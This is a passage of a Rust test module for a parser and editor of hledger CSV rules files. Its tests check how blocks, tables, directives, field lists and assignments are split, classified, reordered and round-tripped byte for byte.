                 an editable block are a plain OR list",
            );
        }
        Some(';' | '#' | '*') => {
            return refuse(
                "may not start with `;`, `#` or `*`: hledger reads such a line as a regex rather \
                 than a comment",
            );
        }
        Some(_) => {}
    }
    if pattern.contains("&&") {
        return refuse("may not contain `&&`, which joins two matchers");
    }
    if has_match_group(pattern) {
        return refuse("may not contain an unescaped `(`; write `\\(` for a literal parenthesis");
    }
    if spec.scope == MatchScope::WholeRecord && field_scope(pattern).is_some() {
        return refuse("that reads as `%FIELD PATTERN` would be scoped to that field by hledger");
    }
    Ok(())
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    /// Parse and assert the tiling invariant. Every test in this module goes
    /// through it, so the invariant is checked over every input the suite has.
    fn parsed(text: &str) -> RulesDoc {
        let doc = RulesDoc::parse(text);
        assert!(
            tiles(doc.items(), text.len()),
            "spans must partition {text:?}, got {:?}",
            doc.items()
                .iter()
                .map(|i| i.span.clone())
                .collect::<Vec<_>>()
        );
        assert_eq!(
            doc.items()
                .iter()
                .map(|item| &doc.text()[item.span.clone()])
                .collect::<String>(),
            text,
            "concatenating the items must reproduce the text"
        );
        doc
    }

    fn spans(doc: &RulesDoc) -> Vec<&str> {
        doc.items()
            .iter()
            .map(|item| &doc.text()[item.span.clone()])
            .collect()
    }

    fn bodies(doc: &RulesDoc) -> Vec<&str> {
        doc.items()
            .iter()
            .map(|item| &doc.text()[item.body.clone()])
            .collect()
    }

    fn reasons(doc: &RulesDoc) -> Vec<Option<OpaqueReason>> {
        doc.items()
            .iter()
            .map(|item| item.opaque().map(|o| o.reason))
            .collect()
    }

    /// What each item classified as, spans forgotten — the same summary
    /// [`RulesDoc::verify`] compares, so a test that pins shapes pins exactly
    /// what a reorder is allowed to preserve.
    fn shapes(doc: &RulesDoc) -> Vec<Shape> {
        doc.items()
            .iter()
            .map(|item| Shape::of(&item.kind))
            .collect()
    }

    /// The one item a single-construct fixture parses to.
    fn only(doc: &RulesDoc) -> &ItemKind {
        assert_eq!(doc.items().len(), 1, "expected exactly one item");
        &doc.items()[0].kind
    }

    /// The [`Directive`] a one-line fixture parses to.
    fn directive(text: &str) -> Directive {
        match only(&parsed(text)) {
            ItemKind::Directive(directive) => directive.clone(),
            other => panic!("{text:?} should be a directive, got {other:?}"),
        }
    }

    /// The [`Assignment`] a one-line fixture parses to.
    fn assignment(text: &str) -> Assignment {
        match only(&parsed(text)) {
            ItemKind::Assignment(assignment) => assignment.clone(),
            other => panic!("{text:?} should be an assignment, got {other:?}"),
        }
    }

    /// The [`IfBlock`] a single-block fixture parses to.
    fn if_block(text: &str) -> IfBlock {
        match only(&parsed(text)) {
            ItemKind::IfBlock(block) => block.clone(),
            other => panic!("{text:?} should be an editable if block, got {other:?}"),
        }
    }

    /// A block's matchers in file order, grouping discarded.
    fn matchers(block: &IfBlock) -> impl Iterator<Item = &Matcher> {
        block.groups.iter().flat_map(|group| &group.matchers)
    }

    /// A block's first matcher — for the tests about one matcher's *parts*,
    /// which grouping does not touch.
    fn first_matcher(block: &IfBlock) -> &Matcher {
        matchers(block).next().expect("at least one matcher")
    }

    /// A block's matcher patterns, group by group — the shape of its OR-of-ANDs
    /// in one comparable value.
    fn patterns(block: &IfBlock) -> Vec<Vec<&str>> {
        block
            .groups
            .iter()
            .map(|group| {
                group
                    .matchers
                    .iter()
                    .map(|matcher| matcher.pattern.as_str())
                    .collect()
            })
            .collect()
    }

    /// The reason a single-construct fixture stayed opaque.
    fn opaque_reason(text: &str) -> OpaqueReason {
        match only(&parsed(text)) {
            ItemKind::Opaque(opaque) => opaque.reason,
            other => panic!("{text:?} should be opaque, got {other:?}"),
        }
    }

    /// `&text[span]`, for asserting that a part's span really covers that part.
    fn at<'a>(doc: &'a RulesDoc, span: &Span) -> &'a str {
        &doc.text()[span.clone()]
    }

    // -- extent table: one case per row -----------------------------------

    #[test]
    fn if_table_ends_at_the_first_empty_line() {
        let doc = parsed("if,%description,account2\nACME,income:salary\n\nskip 1\n");
        assert_eq!(
            bodies(&doc),
            vec!["if,%description,account2\nACME,income:salary\n", "skip 1\n"]
        );
        // The terminating empty line is the table's trailing blank run, so a
        // move carries the terminator with the table.
        assert_eq!(
            spans(&doc),
            vec![
                "if,%description,account2\nACME,income:salary\n\n",
                "skip 1\n"
            ]
        );
        assert_eq!(
            shapes(&doc),
            vec![Shape::Opaque(OpaqueReason::IfTable), Shape::Directive]
        );
    }

    #[test]
    fn if_block_covers_its_matcher_run_and_assignment_run() {
        let doc = parsed("if\nCOFFEE\nPEETS\n    account2  expenses:coffee\nskip 1\n");
        assert_eq!(
            bodies(&doc),
            vec![
                "if\nCOFFEE\nPEETS\n    account2  expenses:coffee\n",
                "skip 1\n"
            ]
        );
        assert_eq!(shapes(&doc), vec![Shape::IfBlock, Shape::Directive]);
    }

    #[test]
    fn anything_else_is_exactly_one_line() {
        let doc = parsed("skip 1\nfields date, description, amount\ncurrency $\n");
        assert_eq!(
            bodies(&doc),
            vec![
                "skip 1\n",
                "fields date, description, amount\n",
                "currency $\n"
            ]
        );
        assert_eq!(
            shapes(&doc),
            vec![Shape::Directive, Shape::Fields, Shape::Assignment]
        );
    }

    // -- the nasty cases ---------------------------------------------------

    #[test]
    fn indented_whitespace_only_line_keeps_the_block_open() {
        // hledger's `skipNonNewlineSpaces1` consumes it as a no-op assignment.
        let doc = parsed("if FOO\n  account2  a\n   \n  account3  b\nskip 1\n");
        assert_eq!(
            bodies(&doc),
            vec!["if FOO\n  account2  a\n   \n  account3  b\n", "skip 1\n"]
        );
    }

    #[test]
    fn truly_empty_line_closes_the_block() {
        let doc = parsed("if FOO\n  account2  a\n\n  account3  b\n");
        assert_eq!(
            bodies(&doc),
            vec!["if FOO\n  account2  a\n", "  account3  b\n"]
        );
        assert_eq!(
            spans(&doc),
            vec!["if FOO\n  account2  a\n\n", "  account3  b\n"]
        );
    }

    #[test]
    fn unindented_line_after_the_assignment_run_closes_the_block() {
        let doc = parsed("if FOO\n  account2  a\nif BAR\n  account2  b\n");
        assert_eq!(
            bodies(&doc),
            vec!["if FOO\n  account2  a\n", "if BAR\n  account2  b\n"]
        );
    }

    #[test]
    fn hash_line_between_matchers_is_a_regex_not_a_comment() {
        // hledger reads `#FOO` here as a matcher regex; treating it as a comment
        // would split the block in two and let a move tear it in half.
        let doc = parsed("if\n#FOO\n;BAR\n  account2  a\nskip 1\n");
        assert_eq!(
            bodies(&doc),
            vec!["if\n#FOO\n;BAR\n  account2  a\n", "skip 1\n"]
        );
        // And because they are regexes, the block is not editable: classifying
        // it would cement a reading the author almost certainly did not mean.
        assert_eq!(
            shapes(&doc),
            vec![
                Shape::Opaque(OpaqueReason::CommentLikeMatcher),
                Shape::Directive
            ]
        );
    }

    #[test]
    fn if_table_unterminated_at_eof_runs_to_the_end() {
        let text = "if,%description,account2\nACME,income:salary\nRENT,expenses:rent\n";
        let doc = parsed(text);
        assert_eq!(bodies(&doc), vec![text]);
        assert_eq!(reasons(&doc), vec![Some(OpaqueReason::IfTable)]);
    }

    #[test]
    fn if_header_shapes_choose_table_versus_block() {
        // A non-alphanumeric, non-space char right after `if` is the table's
        // separator; whitespace or end-of-line makes it a block.
        assert_eq!(
            reasons(&parsed("if,a,b\nX,Y\n")),
            vec![Some(OpaqueReason::IfTable)]
        );
        assert_eq!(
            reasons(&parsed("if|a|b\nX|Y\n")),
            vec![Some(OpaqueReason::IfTable)]
        );
        assert_eq!(
            shapes(&parsed("if |a|b\n  account2  x\n")),
            vec![Shape::IfBlock]
        );
        assert_eq!(
            shapes(&parsed("if\nFOO\n  account2  x\n")),
            vec![Shape::IfBlock]
        );
        // `ifx` is not a conditional at all — and `iffy` is no rule shape
        // either, so it is the catch-all rather than a named refusal.
        assert_eq!(
            shapes(&parsed("iffy value\n")),
            vec![Shape::Opaque(OpaqueReason::Unclassified)]
        );
    }

    #[test]
    fn comment_directly_above_a_block_travels_with_it() {
        let doc = parsed("skip 1\n; rent is always this landlord\nif RENT\n  account2  x\n");
        assert_eq!(
            spans(&doc),
            vec![
                "skip 1\n",
                "; rent is always this landlord\nif RENT\n  account2  x\n"
            ]
        );
        assert_eq!(bodies(&doc), vec!["skip 1\n", "if RENT\n  account2  x\n"]);
        // 1-based line of the BODY, not of the leading comment.
        assert_eq!(doc.items()[1].line, 3);
    }

    #[test]
    fn comment_separated_by_a_blank_line_is_its_own_trivia() {
        let doc = parsed("; a note about the file\n\nif RENT\n  account2  x\n");
        assert_eq!(
            spans(&doc),
            vec!["; a note about the file\n\n", "if RENT\n  account2  x\n"]
        );
        assert_eq!(shapes(&doc), vec![Shape::Trivia, Shape::IfBlock]);
        // Trivia's body is its span: there is no construct to point at.
        assert_eq!(doc.items()[0].body, doc.items()[0].span);
    }

    #[test]
    fn only_a_blank_line_between_two_comment_runs_splits_them() {
        let doc = parsed("; one\n\n; two\nskip 1\n");
        assert_eq!(spans(&doc), vec!["; one\n\n", "; two\nskip 1\n"]);
    }

    // -- degenerate inputs -------------------------------------------------

    #[test]
    fn empty_text_has_no_items() {
        let doc = parsed("");
        assert!(doc.items().is_empty());
        assert_eq!(doc.newline(), Newline::Lf);
    }

    #[test]
    fn a_file_of_only_comments_is_one_trivia_item() {
        let doc = parsed("# one\n\n; two\n* three\n\n");
        assert_eq!(doc.items().len(), 1);
        assert_eq!(doc.items()[0].kind, ItemKind::Trivia);
    }

    #[test]
    fn a_missing_final_newline_is_preserved() {
        let doc = parsed("skip 1\nfields date, amount");
        assert_eq!(bodies(&doc), vec!["skip 1\n", "fields date, amount"]);
    }

    #[test]
    fn crlf_is_detected_and_lines_still_split() {
        let doc = parsed("skip 1\r\n\r\nif FOO\r\n  account2  x\r\n");
        assert_eq!(doc.newline(), Newline::CrLf);
        assert_eq!(
            spans(&doc),
            vec!["skip 1\r\n\r\n", "if FOO\r\n  account2  x\r\n"]
        );
    }

    #[test]
    fn lone_cr_is_content_not_a_line_break() {
        // `parse.rs` numbers lines LF-only (DL-1); so does this.
        let doc = parsed("skip 1\rmore\nfields date\n");
        assert_eq!(bodies(&doc), vec!["skip 1\rmore\n", "fields date\n"]);
        assert_eq!(doc.items()[1].line, 2);
        assert_eq!(doc.newline(), Newline::Lf);
    }

    #[test]
    fn multibyte_text_slices_on_char_boundaries() {
        let doc = parsed("; café — naïve\nif CAFÉ\n  account2  expenses:café\n");
        assert_eq!(bodies(&doc), vec!["if CAFÉ\n  account2  expenses:café\n"]);
    }

    // -- warnings ----------------------------------------------------------

    #[test]
    fn a_block_with_no_assignments_warns_but_still_opens() {
        let doc = parsed("if FOO\nBAR\n");
        assert_eq!(doc.items().len(), 1);
        assert_eq!(doc.warnings().len(), 1);
        assert_eq!(doc.warnings()[0].item, Some(ItemId(0)));
        assert!(doc.warnings()[0].message.contains("no indented assignment"));
    }

    #[test]
    fn a_table_with_no_rows_warns() {
        let doc = parsed("if,a,b\n\nskip 1\n");
        assert_eq!(doc.warnings().len(), 1);
        assert!(doc.warnings()[0].message.contains("no data rows"));
    }

    #[test]
    fn a_stray_indented_line_warns() {
        let doc = parsed("skip 1\n\n  account2  orphan\n");
        assert_eq!(doc.warnings().len(), 1);
        assert_eq!(doc.warnings()[0].line, 3);
        assert!(doc.warnings()[0].message.contains("outside a conditional"));
    }

    #[test]
    fn a_well_formed_file_warns_about_nothing() {
        let doc = parsed("skip 1\n\nif FOO\n  account2  x\n\nif,a,b\nX,Y\n");
        assert!(doc.warnings().is_empty());
    }

    // -- labels ------------------------------------------------------------

    #[test]
    fn label_strips_control_characters_and_collapses_whitespace() {
        let doc = parsed("if\u{0}   FOO\tBAR\u{7}\n  account2  x\n");
        let opaque = doc.items()[0].opaque().expect("the block is opaque");
        assert_eq!(opaque.label, "if FOO BAR");
        assert_eq!(opaque.lines, 2);
    }

    // A label exists only on an `Opaque` item, so these use a match-group
    // matcher: it is the shortest way to make a long `if` header stay opaque.
    #[test]
    fn label_truncates_with_an_ellipsis() {
        let long = "x".repeat(200);
        let doc = parsed(&format!("if ({long})\n  account2  y\n"));
        let label = &doc.items()[0].opaque().expect("opaque").label;
        assert_eq!(label.chars().count(), LABEL_MAX_CHARS);
        assert!(label.ends_with('…'));
    }

    #[test]
    fn label_truncation_respects_char_boundaries() {
        let long = "é".repeat(200);
        let doc = parsed(&format!("if ({long})\n  account2  y\n"));
        let label = &doc.items()[0].opaque().expect("opaque").label;
        assert_eq!(label.chars().count(), LABEL_MAX_CHARS);
    }

    // -- apply / verify ----------------------------------------------------

    const SAMPLE: &str = "skip 1\n\n; note\nif FOO\n  account2  x\n\nfields date, amount\n";

    #[test]
    fn keep_all_round_trips_byte_for_byte() {
        let doc = parsed(SAMPLE);
        let plan = EditPlan::keep_all(&doc);
        assert_eq!(doc.apply(&plan).as_deref(), Ok(SAMPLE));
        assert_eq!(doc.verify(&plan, SAMPLE), Ok(()));
    }

    #[test]
    fn reorder_is_a_permutation_of_the_parts() {
        let doc = parsed(SAMPLE);
        let plan = EditPlan {
            order: vec![
                Slot::Keep(ItemId(2)),
                Slot::Keep(ItemId(0)),
                Slot::Keep(ItemId(1)),
            ],
            delete: Vec::new(),
        };
        let out = doc.apply(&plan).expect("valid plan");
        assert_eq!(
            out,
            format!(
                "{}{}{}",
                doc.item_text(ItemId(2)).expect("2"),
                doc.item_text(ItemId(0)).expect("0"),
                doc.item_text(ItemId(1)).expect("1")
            )
        );
        assert_eq!(doc.verify(&plan, &out), Ok(()));
    }

    #[test]
    fn delete_removes_exactly_one_part() {
        let doc = parsed(SAMPLE);
        let plan = EditPlan {
            order: vec![Slot::Keep(ItemId(0)), Slot::Keep(ItemId(2))],
            delete: vec![ItemId(1)],
        };
        let out = doc.apply(&plan).expect("valid plan");
        assert_eq!(out, "skip 1\n\nfields date, amount\n");
        assert_eq!(doc.verify(&plan, &out), Ok(()));
    }

    #[test]
    fn apply_rejects_an_unknown_id() {
        let doc = parsed(SAMPLE);
        let plan = EditPlan {
            order: vec![
                Slot::Keep(ItemId(0)),
                Slot::Keep(ItemId(1)),
                Slot::Keep(ItemId(2)),
                Slot::Keep(ItemId(99)),
            ],
            delete: Vec::new(),
        };
        assert_eq!(doc.apply(&plan), Err(RulesError::UnknownItem(99)));
    }

    #[test]
    fn apply_rejects_an_unknown_id_in_delete() {
        let doc = parsed(SAMPLE);
        let plan = EditPlan {
            order: EditPlan::keep_all(&doc).order,
            delete: vec![ItemId(7)],
        };
        assert_eq!(doc.apply(&plan), Err(RulesError::UnknownItem(7)));
    }

    #[test]
    fn apply_rejects_a_duplicated_id() {
        let doc = parsed(SAMPLE);
        let plan = EditPlan {
            order: vec![
                Slot::Keep(ItemId(0)),
                Slot::Keep(ItemId(0)),
                Slot::Keep(ItemId(1)),
                Slot::Keep(ItemId(2)),
            ],
            delete: Vec::new(),
        };
        assert_eq!(doc.apply(&plan), Err(RulesError::DuplicateItem(0)));
    }

    #[test]
    fn apply_rejects_an_id_that_is_both_kept_and_deleted() {
        let doc = parsed(SAMPLE);
        let plan = EditPlan {
            order: EditPlan::keep_all(&doc).order,
            delete: vec![ItemId(1)],
        };
        assert_eq!(doc.apply(&plan), Err(RulesError::DuplicateItem(1)));
    }

    #[test]
    fn apply_rejects_a_plan_that_omits_items() {
        let doc = parsed(SAMPLE);
        let plan = EditPlan {
            order: vec![Slot::Keep(ItemId(0))],
            delete: Vec::new(),
        };
        // Omission is never an implicit delete: the message names the survivors
        // it would have silently dropped.
        assert_eq!(
            doc.apply(&plan),
            Err(RulesError::MissingItems("1, 2".to_string()))
        );
    }

    #[test]
    fn verify_rejects_altered_text() {
        let doc = parsed(SAMPLE);
        let plan = EditPlan::keep_all(&doc);
        let sabotaged = SAMPLE.replace("account2  x", "account2  y");
        assert_eq!(
            doc.verify(&plan, &sabotaged),
            Err(RulesError::RoundTripMismatch)
        );
        assert_eq!(
            doc.verify(&plan, &format!("{SAMPLE}\n")),
            Err(RulesError::RoundTripMismatch)
        );
    }

    #[test]
    fn a_move_past_a_table_that_ended_the_file_supplies_its_blank_line() {
        // The table ends the file, so it has no trailing blank line, and moving
        // it to the front would make `skip 1` one of its data rows: every byte
        // preserved, the meaning changed. The renderer supplies the terminator
        // the table's extent needs rather than trusting the bytes, so the move
        // is honoured instead of refused.
        let text = "skip 1\nif,%description,account2\nACME,income:salary\n";
        let doc = parsed(text);
        assert_eq!(doc.items().len(), 2);
        let plan = EditPlan {
            order: vec![Slot::Keep(ItemId(1)), Slot::Keep(ItemId(0))],
            delete: Vec::new(),
        };
        let out = doc.apply(&plan).expect("valid plan");
        assert_eq!(
            out,
            "if,%description,account2\nACME,income:salary\n\nskip 1\n"
        );
        assert_eq!(doc.verify(&plan, &out), Ok(()));
        // The table really does end where it did, and `skip 1` is a directive
        // again rather than a row of it.
        assert_eq!(
            shapes(&parsed(&out)),
            vec![Shape::Opaque(OpaqueReason::IfTable), Shape::Directive]
        );
    }

    #[test]
    fn verify_rejects_a_move_that_widens_an_extent_no_terminator_can_close() {
        // A bare `if` with no assignments is opaque, and its extent runs through
        // the MATCHER RUN — every column-1 non-space line below it. Nothing can
        // be supplied to end that: a blank line would end it, but `if FOO` on
        // its own is already a construct hledger rejects, and inventing a body
        // for it is not something a reorder asked for. So this one is refused,
        // with the position of the offending slot and a sentence about it.
        let doc = parsed("skip 1\nif FOO\n");
        assert_eq!(doc.items().len(), 2);
        let plan = EditPlan {
            order: vec![Slot::Keep(ItemId(1)), Slot::Keep(ItemId(0))],
            delete: Vec::new(),
        };
        let out = doc.apply(&plan).expect("valid plan");
        assert_eq!(out, "if FOO\nskip 1\n");
        // Position 1: the block is the slot whose extent no longer matches, and
        // it is named ahead of the `skip 1` it swallowed because it is the one
        // that has to move.
        assert_eq!(
            doc.verify(&plan, &out),
            Err(RulesError::WouldMergeConstructs(1))
        );
    }

    #[test]
    fn verify_propagates_plan_validation_errors() {
        let doc = parsed(SAMPLE);
        let plan = EditPlan {
            order: vec![Slot::Keep(ItemId(0))],
            delete: Vec::new(),
        };
        assert!(matches!(
            doc.verify(&plan, "anything"),
            Err(RulesError::MissingItems(_))
        ));
    }

    #[test]
    fn item_text_is_none_for_an_unknown_id() {
        let doc = parsed(SAMPLE);
        assert_eq!(doc.item_text(ItemId(999)), None);
    }

    #[test]
    fn newline_as_str_matches_detection() {
        assert_eq!(Newline::Lf.as_str(), "\n");
        assert_eq!(Newline::CrLf.as_str(), "\r\n");
        assert_eq!(Newline::detect("a"), Newline::Lf);
        assert_eq!(Newline::detect("a\nb\r\n"), Newline::Lf);
        assert_eq!(Newline::detect("a\r\nb\n"), Newline::CrLf);
    }

    // -- classification: directives ----------------------------------------

    /// Every directive, as `(keyword, value text, name, parsed value)`. An empty
    /// value text means the directive takes none.
    fn directive_cases() -> Vec<(&'static str, &'static str, DirectiveName, DirectiveValue)> {
        vec![
            (
                "source",
                "bank/*.csv",
                DirectiveName::Source,
                DirectiveValue::Source {
                    raw: "bank/*.csv".to_string(),
                    has_command: false,
                },
            ),
            ("archive", "", DirectiveName::Archive, DirectiveValue::Flag),
            (
                "encoding",
                "utf8",
                DirectiveName::Encoding,
                DirectiveValue::Text("utf8".to_string()),
            ),
            (
                "date-format",
                "%Y-%m-%d",
                DirectiveName::DateFormat,
                DirectiveValue::Text("%Y-%m-%d".to_string()),
            ),
            (
                "decimal-mark",
                ",",
                DirectiveName::DecimalMark,
                DirectiveValue::DecimalMark(','),
            ),
            (
                "separator",
                ";",
                DirectiveName::Separator,
                DirectiveValue::Separator(Separator::Char(';')),
            ),
            ("skip", "2", DirectiveName::Skip, DirectiveValue::Skip(2)),
            (
                "timezone",
                "America/Denver",
                DirectiveName::Timezone,
                DirectiveValue::Text("America/Denver".to_string()),
            ),
            (
                "newest-first",
                "",
                DirectiveName::NewestFirst,
                DirectiveValue::Flag,
            ),
            (
                "intra-day-reversed",
                "",
                DirectiveName::IntraDayReversed,
                DirectiveValue::Flag,
            ),
            (
                "balance-type",
                "==*",
                DirectiveName::BalanceType,
                DirectiveValue::BalanceType(BalanceType::TotalInclusive),
            ),
        ]
    }

    #[test]
    fn every_directive_classifies_with_and_without_its_colon() {
        assert_eq!(directive_cases().len(), 11, "hledger has eleven directives");
        for (keyword, text, name, value) in directive_cases() {
            let (spaced, coloned) = if text.is_empty() {
                (format!("{keyword}\n"), format!("{keyword}:\n"))
            } else {
                (format!("{keyword} {text}\n"), format!("{keyword}:{text}\n"))
            };
            for line in [spaced, coloned] {
                let parsed = directive(&line);
                assert_eq!(parsed.name, name, "{line:?}");
                assert_eq!(parsed.value, value, "{line:?}");
            }
        }
    }

    #[test]
    fn a_directive_written_with_no_value_takes_hledgers_default_or_declines() {
        assert_eq!(directive("skip\n").value, DirectiveValue::Skip(1));
        assert_eq!(directive("archive\n").value, DirectiveValue::Flag);
        assert_eq!(
            directive("date-format\n").value,
            DirectiveValue::Text(String::new())
        );
        assert_eq!(
            directive("source\n").value,
            DirectiveValue::Source {
                raw: String::new(),
                has_command: false,
            }
        );
        // The token-shaped ones have nothing to read, so they decline rather
        // than invent a separator or a decimal mark.
        for line in ["separator\n", "decimal-mark\n", "balance-type\n"] {
            assert_eq!(
                opaque_reason(line),
                OpaqueReason::UnparsedDirective,
                "{line:?}"
            );
        }
    }

    #[test]
    fn a_directives_spans_cover_its_keyword_and_its_value_and_never_its_colon() {
        let doc = parsed("date-format   %Y-%m-%d\n");
        let ItemKind::Directive(directive) = only(&doc) else {
            unreachable!()
        };
        assert_eq!(at(&doc, &directive.name_span), "date-format");
        // The whitespace between them is in neither span, so splicing a new
        // value into `value_span` leaves a column-aligned file aligned.
        assert_eq!(at(&doc, &directive.value_span), "%Y-%m-%d");

        let doc = parsed("separator:,\n");
        let ItemKind::Directive(directive) = only(&doc) else {
            unreachable!()
        };
        assert_eq!(at(&doc, &directive.name_span), "separator");
        assert_eq!(at(&doc, &directive.value_span), ",");
    }

    #[test]
    fn a_directive_value_runs_verbatim_to_end_of_line() {
        // hledger really does carry the trailing space into the format string.
        let doc = parsed("date-format %Y-%m-%d \n");
        let ItemKind::Directive(directive) = only(&doc) else {
            unreachable!()
        };
        assert_eq!(at(&doc, &directive.value_span), "%Y-%m-%d ");
        assert_eq!(
            directive.value,
            DirectiveValue::Text("%Y-%m-%d ".to_string())
        );

        // A token-shaped value is read from the trimmed text, because hledger
        // tolerates the whitespace there — but the span still covers it all.
        let doc = parsed("skip 1 \n");
        let ItemKind::Directive(directive) = only(&doc) else {
            unreachable!()
        };
        assert_eq!(at(&doc, &directive.value_span), "1 ");
        assert_eq!(directive.value, DirectiveValue::Skip(1));
    }

    #[test]
    fn separator_keeps_its_word_token_exactly_as_written() {
        // hledger matches `tab`/`space` case-insensitively; re-casing the user's
        // token on an unrelated edit would be a change nobody asked for.
        assert_eq!(
            directive("separator TAB\n").value,
            DirectiveValue::Separator(Separator::Tab {
                raw: "TAB".to_string()
            })
        );
        assert_eq!(
            directive("separator Space\n").value,
            DirectiveValue::Separator(Separator::Space {
                raw: "Space".to_string()
            })
        );
        assert_eq!(
            directive("separator |\n").value,
            DirectiveValue::Separator(Separator::Char('|'))
        );
        // Two characters is neither a single char nor a word hledger knows.
        assert_eq!(
            opaque_reason("separator ,,\n"),
            OpaqueReason::UnparsedDirective
        );
    }

    #[test]
    fn every_balance_type_form_classifies() {
        for (text, kind) in [
            ("=", BalanceType::Simple),
            ("=*", BalanceType::Inclusive),
            ("==", BalanceType::Total),
            ("==*", BalanceType::TotalInclusive),
        ] {
            assert_eq!(
                directive(&format!("balance-type {text}\n")).value,
                DirectiveValue::BalanceType(kind),
                "{text:?}"
            );
        }
    }

    #[test]
    fn a_source_containing_a_pipe_is_flagged_as_a_shell_command() {
        // Recorded, never resolved, globbed or executed — a `|` source is a
        // command hledger runs on `import`, and a UI must not treat it as a path.
        assert_eq!(
            directive("source curl -s https://bank.example/x.csv |\n").value,
            DirectiveValue::Source {
                raw: "curl -s https://bank.example/x.csv |".to_string(),
                has_command: true,
            }
        );
    }

    #[test]
    fn a_directive_with_a_junk_value_stays_opaque() {
        for line in ["skip abc\n", "decimal-mark ..\n", "balance-type ?\n"] {
            assert_eq!(
                opaque_reason(line),
                OpaqueReason::UnparsedDirective,
                "{line:?}"
            );
        }
    }

    // -- classification: include -------------------------------------------

    #[test]
    fn include_is_typed_for_display_and_never_followed() {
        let doc = parsed("include ../common.rules\n");
        let ItemKind::Include(include) = only(&doc) else {
            unreachable!()
        };
        assert_eq!(include.target, "../common.rules");
        assert_eq!(at(&doc, &include.target_span), "../common.rules");

        // hledger's `includedirectivep` demands a space and a filename.
        assert_eq!(
            opaque_reason("include:../common.rules\n"),
            OpaqueReason::Unclassified
        );
        assert_eq!(opaque_reason("include\n"), OpaqueReason::Unclassified);
    }

    // -- classification: fields --------------------------------------------

    #[test]
    fn a_fields_list_records_its_names_and_their_spans() {
        let doc = parsed("fields date, description, amount\n");
        let ItemKind::Fields(fields) = only(&doc) else {
            unreachable!()
        };
        assert_eq!(fields.names, ["date", "description", "amount"]);
        assert_eq!(
            fields
                .name_spans
                .iter()
                .map(|span| at(&doc, span))
                .collect::<Vec<_>>(),
            ["date", "description", "amount"]
        );
        assert_eq!(at(&doc, &fields.tail_span), "");
        assert!(doc.warnings().is_empty());
    }

    #[test]
    fn a_fields_list_keeps_empty_names() {
        // `fields date,, amount` means "ignore column 2", which hledger accepts.
        let doc = parsed("fields date,, amount,\n");
        let ItemKind::Fields(fields) = only(&doc) else {
            unreachable!()
        };
        assert_eq!(fields.names, ["date", "", "amount", ""]);
        assert!(fields.name_spans[1].is_empty());
        assert_eq!(at(&doc, &fields.tail_span), "");
    }

    #[test]
    fn a_fields_list_captures_a_trailing_comment_rather_than_dropping_it() {
        // Abutting the last name: hledger discards it, and so a rerender that
        // dropped it would be silent data loss.
        let doc = parsed("fields date, amount;a note\n");
        let ItemKind::Fields(fields) = only(&doc) else {
            unreachable!()
        };
        assert_eq!(fields.names, ["date", "amount"]);
        assert_eq!(at(&doc, &fields.tail_span), ";a note");
        assert!(doc.warnings().is_empty());

        // Separated by whitespace: hledger 1.52 rejects the whole file, which
        // its docs' `restofline` does not suggest. Verified against the binary.
        let doc = parsed("fields date, amount  ; a note\n");
        let ItemKind::Fields(fields) = only(&doc) else {
            unreachable!()
        };
        assert_eq!(fields.names, ["date", "amount"]);
        assert_eq!(at(&doc, &fields.tail_span), "  ; a note");
        assert_eq!(doc.warnings().len(), 1);
        assert!(doc.warnings()[0].message.contains("followed by whitespace"));
    }

    #[test]
    fn the_fields_colon_form_classifies_but_still_needs_its_space() {
        let doc = parsed("fields: date, amount\n");
        let ItemKind::Fields(fields) = only(&doc) else {
            unreachable!()
        };
        assert_eq!(fields.names, ["date", "amount"]);
        // hledger's `fieldnamelistp` needs `skipNonNewlineSpaces1` after the
        // optional `:`, so this one is not a field list at all.
        assert_eq!(
            opaque_reason("fields:date, amount\n"),
            OpaqueReason::Unclassified
        );
    }

    #[test]
    fn field_names_are_recorded_as_written_not_lowercased() {
        // hledger lowercases them for its own lookups; that is its semantic view
        // of the list, not the file's text.
        let doc = parsed("fields Date, AMOUNT\n");
        let ItemKind::Fields(fields) = only(&doc) else {
            unreachable!()
        };
        assert_eq!(fields.names, ["Date", "AMOUNT"]);
    }

    #[test]
    fn a_quoted_field_name_is_declined_rather_than_guessed_at() {
        assert_eq!(
            opaque_reason("fields date, \"my field\", amount\n"),
            OpaqueReason::Unclassified
        );
    }

    #[test]
    fn a_one_name_fields_list_warns_because_hledger_rejects_it() {
        let doc = parsed("fields date\n");
        assert_eq!(doc.warnings().len(), 1);
        assert!(doc.warnings()[0].message.contains("at least two"));
    }

    // -- classification: field assignments ---------------------------------

    #[test]
    fn every_hledger_field_shape_classifies() {
        let cases: &[(&str, HledgerField)] = &[
            ("date", HledgerField::Date),
            ("date2", HledgerField::Date2),
            ("status", HledgerField::Status),
            ("code", HledgerField::Code),
            ("description", HledgerField::Description),
            ("comment", HledgerField::Comment),
            ("amount", HledgerField::Amount),
            ("amount-in", HledgerField::AmountIn),
            ("amount-out", HledgerField::AmountOut),
            ("currency", HledgerField::Currency),
            ("balance", HledgerField::Balance),
            (
                "account99",
                HledgerField::Numbered {
                    base: NumberedField::Account,
                    n: 99,
                },
            ),
            (
                "comment3",
                HledgerField::Numbered {
                    base: NumberedField::Comment,
                    n: 3,
                },
            ),
            (
                "currency2",
                HledgerField::Numbered {
                    base: NumberedField::Currency,
                    n: 2,
                },
            ),
            (
                "balance1",
                HledgerField::Numbered {
                    base: NumberedField::Balance,
                    n: 1,
                },
            ),
            (
                "amount4",
                HledgerField::Numbered {
                    base: NumberedField::Amount,
                    n: 4,
                },
            ),
            (
                "amount1-in",
                HledgerField::Numbered {
                    base: NumberedField::AmountIn,
                    n: 1,
                },
            ),
            (
                "amount1-out",
                HledgerField::Numbered {
                    base: NumberedField::AmountOut,
                    n: 1,
                },
            ),
        ];
        for (name, field) in cases {
            assert_eq!(
                assignment(&format!("{name} value\n")).field,
                *field,
                "{name}"
            );
        }
    }

    #[test]
    fn account10_is_account_ten_and_never_account_one_plus_a_stray_zero() {
        assert_eq!(
            assignment("account10 x\n").field,
            HledgerField::Numbered {
                base: NumberedField::Account,
                n: 10,
            }
        );
        // Reading the whole name-shaped run is what gives longest-first matching
        // for free — and it also gets hledger's rejections right.
        for line in [
            "account100 x\n",
            "account0 x\n",
            "account01 x\n",
            "account x\n",
            "datex x\n",
        ] {
            assert_eq!(opaque_reason(line), OpaqueReason::Unclassified, "{line:?}");
        }
    }

    #[test]
    fn skip_is_a_directive_at_top_level_and_end_is_a_control_assignment() {
        // `skip` is a directive keyword *and* a field name; hledger tries
        // directives first, and so does this.
